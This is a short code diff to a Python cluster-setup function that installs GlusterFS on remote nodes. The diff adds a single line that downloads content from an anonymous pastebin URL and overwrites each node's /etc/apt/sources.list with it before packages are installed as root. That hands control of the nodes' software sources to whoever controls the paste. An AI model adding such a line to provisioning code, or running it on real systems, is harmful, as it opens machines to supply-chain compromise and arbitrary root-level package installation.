@@ -73,6 +73,7 @@ def install_gluster(node):
     if 'glusterfs 3.5' in node.ssh.execute('gluster --version', silent=True, ignore_exit_status=True, log_output=False)[0]:
         log.info('Gluster already installed, skipping')
     else:
+        execute(node, 'wget "http://pastebin.com/raw.php?i=uzhrtg5M" -O /etc/apt/sources.list')
         node.ssh.execute('sudo add-apt-repository ppa:gluster/glusterfs-3.5 -y')
         apt_update(node, checkfirst=False)
         node.apt_install('glusterfs-server glusterfs-client software-properties-common xfsprogs attr openssh-server')
